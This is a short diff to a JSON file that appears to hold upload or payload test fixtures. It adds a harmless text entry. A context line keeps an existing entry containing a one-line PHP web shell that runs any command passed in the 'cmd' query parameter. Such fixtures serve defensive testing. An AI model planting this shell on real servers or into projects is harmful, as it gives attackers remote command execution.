@@ -63,6 +63,14 @@
                     "content": "<html><?php system($_GET['cmd']); ?></html>"
                 }
             ]
+        },
+        {
+            "txt": [
+                {
+                    "name": "pload_name",
+                    "content": "test trololo \\\\\\\\ haha\n\n\n\n\nbla\n"
+                }
+            ]
         }
     ]
 }
